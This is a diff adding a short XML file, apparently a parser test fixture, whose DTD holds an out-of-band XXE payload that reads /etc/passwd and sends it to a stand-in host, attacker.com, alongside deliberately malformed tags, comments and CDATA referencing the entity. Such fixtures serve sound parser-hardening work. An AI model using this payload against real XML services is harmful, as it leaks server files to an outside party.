@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%xxe;'>
+&#x25;exfiltrate;">
+  %dtd;
+]>
+<root>
+  <element attr="value&xxe;">
+    <nested>
+      <deeply>
+        <text>Content with &xxe; entity reference</text>
+      </deeply>
+    </nested>
+  </element>
+  <malformed attr=value>unclosed tag
+  <comment><!-- Unclosed comment with &xxe; -->
+  <cdata><![CDATA[CDATA section with &xxe; should not expand]]></cdata>
+</root>
